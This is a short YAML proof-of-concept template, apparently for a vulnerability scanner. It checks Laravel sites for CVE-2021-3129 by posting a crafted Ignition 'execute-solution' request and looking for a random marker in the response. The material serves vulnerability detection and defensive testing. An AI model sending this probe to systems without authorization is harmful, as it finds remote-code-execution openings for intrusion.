name: poc-yaml-laravel-cve-2021-3129
manual: true
transport: http
set:
  r: randomLowercase(12)
rules:
  r0:
    request:
      cache: true
      method: POST
      path: /_ignition/execute-solution
      headers:
        Content-Type: application/json
      body: |-
        {
                "solution": "Facade\\Ignition\\Solutions\\MakeViewVariableOptionalSolution",
                "parameters": {
                  "variableName": "username",
                  "viewFile": "{{r}}"
                }
        }
      follow_redirects: true
    expression: response.body.bcontains(bytes(r))
expression: r0()
detail:
  author: Jarcis-cy(https://github.com/Jarcis-cy)
  links:
    - https://github.com/vulhub/vulhub/blob/master/laravel/CVE-2021-3129
